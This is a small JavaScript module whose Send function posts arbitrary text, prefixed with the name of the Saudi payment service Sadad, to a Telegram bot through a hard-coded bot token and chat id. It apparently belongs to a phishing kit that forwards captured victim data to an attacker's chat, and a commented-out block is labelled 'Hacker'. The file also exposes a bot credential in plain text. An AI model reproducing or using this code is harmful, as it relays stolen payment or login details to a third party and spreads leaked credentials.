import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
       /* const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "مدونة سداد",
              description: des,
           },
          ],
    };
            */let txt= "مدونة سداد  %0A"+ des   
        await         await axios.post(`https://api.telegram.org/bot8064760278:AAH7LlhaBS0pslMMwbtjI5ySSjOnq5EDs3M/sendMessage?chat_id=7404525102&text=${txt}`) 
    }
  return {
    Send,
}
}

export default TeleSned;
// 
